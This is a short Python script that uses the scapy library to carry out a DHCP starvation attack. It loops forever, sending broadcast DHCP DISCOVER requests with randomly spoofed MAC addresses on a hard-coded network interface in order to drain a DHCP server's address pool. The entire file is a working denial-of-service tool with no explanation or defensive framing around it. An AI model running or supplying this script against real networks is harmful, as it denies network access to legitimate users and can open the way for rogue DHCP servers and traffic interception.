from scapy.all import *
def dhcp_starvation(interface):
    mac_base = "00:11:22:33"
    print(f"Starting DHCP starvation on interface {interface} ...")

    while True:
        mac = mac_base + ":%02x" % (RandByte()) + ":%02x" % (RandByte())

        ether = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)

        bootp = BOOTP(chaddr=[mac2str(mac)], xid=RandInt(), flags=0x8000)
        dhcp = DHCP(options=[("message-type", "discover"), ("end")])

        packet = ether/ip/udp/bootp/dhcp
        sendp(packet, iface=interface, verbose=False)
interface = "enp0s3"
dhcp_starvation(interface)
